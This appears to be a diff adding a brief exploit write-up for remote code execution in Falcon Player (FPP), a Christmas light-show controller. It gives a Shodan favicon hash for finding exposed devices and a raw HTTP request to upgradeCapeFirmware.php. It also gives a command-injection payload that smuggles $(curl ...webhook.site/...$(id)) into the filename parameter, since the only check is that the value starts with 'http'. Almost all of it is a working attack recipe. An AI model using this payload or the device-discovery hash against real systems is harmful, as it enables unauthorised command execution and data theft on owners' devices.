@@ -1,0 +1,28 @@
+collateral dommage of a boring friday
+
+https://github.com/FalconChristmas/fpp
+http.favicon.hash:-615359448
+
+First you need to have a virtual eeprom installed
+
+
+go to /channeloutputs.php and install it if not installed
+
+
+GET /upgradeCapeFirmware.php?filename=/opt/fpp/capes/pi/PiHat-eeprom.bin HTTP/1.1
+Host:x
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
+Accept: */*
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Connection: close
+Referer: x/channeloutputs.php
+Cookie: LIMONADE0x5x0=xxx
+
+then RCE, see https://github.com/FalconChristmas/fpp/blob/master/www/upgradeCapeFirmware.php
+
+
+/upgradeCapeFirmware.php?filename=http://$(curl%20https://webhook.site/xx/$(id))
+
+the only check done is that the arg begin by "http" before passing it to system..
